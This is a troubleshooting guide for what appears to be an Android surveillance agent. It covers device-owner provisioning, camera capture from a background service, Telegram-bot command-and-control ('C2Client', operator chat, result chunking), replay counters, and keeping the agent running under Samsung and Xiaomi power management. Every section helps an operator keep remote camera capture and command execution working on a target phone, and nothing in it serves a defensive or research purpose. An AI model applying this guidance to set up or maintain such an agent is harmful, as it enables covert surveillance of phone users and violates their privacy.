# Troubleshooting

## `dpm set-device-owner` fails

`Error: Not allowed to set the device owner because there are already some accounts`
→ Settings → Accounts → remove every account → retry. If it still fails,
factory reset (DO requires a fresh device or `--force` on some builds).

## Device shows rung 0

No privilege was reached. Run `tools/provision.sh` with the correct serial.
Check `adb shell dpm list-owners`.

## `CameraAccessException: CAMERA_DISABLED (1)`

The foreground service type was not applied before the camera bind.
Confirm `android:foregroundServiceType="camera"` is in the manifest and
`startForeground` runs before `bindToLifecycle`. Reinstall — a stale manifest
survives incremental installs.

## Black frames only

Auto-exposure has not settled. `CaptureService` waits 600 ms; increase to
1200 ms on slow devices. Also confirm the device is not in secure-folder mode.

## `getUpdates` returns 409

A webhook is set. Run
`https://api.telegram.org/bot<TOKEN>/deleteWebhook?drop_pending_updates=false`.

## Commands arrive but nothing executes

- Check `text` starts with `OBS2.` — the console prefixes it, a manual paste
  usually does not.
- Check the envelope `d` field equals the device id.
- `adb logcat -s Obsidian` shows `open` failures from `Envelope.open`.

## `replay` on every message

The device `in_seq` is ahead of the console `seq.<device>`. The console stores
that counter in `localStorage`; clearing site data resets it to 0. Fix: in the
console devtools run `localStorage.removeItem('seq.<device>')` **and** on the
device `adb shell pm clear ai.obsidian.agent` then re-enroll.

## Results show as `{"ok":false,"description":"Bad Request: message is too long"}`

Chunk size exceeded. `C2Client` chunks at 1800 bytes; if you lowered it, raise
it back. Payloads over 9000 bytes go as documents and bypass this.

## `403` from `/agent/*/result`

Bearer mismatch. Compare the device's derived bearer with
`python3 tools/enroll.py` output for the same device. Both must be byte-equal.
Check `Authorization: Bearer <bearer>`, not the raw apiKey.

## Samsung: session dies after hours

Sleeping apps. Settings → Battery → Background usage limits → remove the app
from "Sleeping apps" and "Deep sleeping apps". There is no API for this.

## Xiaomi: dies on screen-off

Security → Permissions → Autostart ON. Battery → No restrictions.

## Screen capture black

`FLAG_SECURE` window. Nothing fixes it without root.

## `selftest.sh` PASS but no results in chat

Worker `OPERATOR_CHAT` is wrong, or the bot was removed from the chat.
Verify with a manual `sendMessage` via curl.
